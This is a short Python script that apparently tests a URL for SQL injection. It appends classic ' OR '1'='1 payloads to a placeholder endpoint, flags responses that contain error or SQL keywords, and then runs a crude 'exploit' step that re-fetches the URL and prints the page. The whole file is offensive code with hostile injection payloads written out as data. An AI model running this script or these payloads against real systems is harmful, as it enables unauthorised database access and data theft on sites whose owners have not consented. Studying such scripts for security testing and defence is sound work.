import requests

payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' /* ", "' OR '1'='1' #"]
url = "http://example.com/vulnerable_endpoint?id="

def check_sql_injection(url, payloads):
    for payload in payloads:
        target_url = url + payload
        response = requests.get(target_url)
        if "error" in response.text.lower() or "sql" in response.text.lower():
            print(f"Possible SQL Injection vulnerability found with payload: {payload}")
            exploit_sql_injection(target_url)
        else:
            print(f"Payload {payload} does not seem to cause an error.")

def exploit_sql_injection(url):
    print(f"Exploiting SQL Injection vulnerability at {url}")
    response = requests.get(url)
    print("Response:")
    print(response.text)

check_sql_injection(url, payloads)
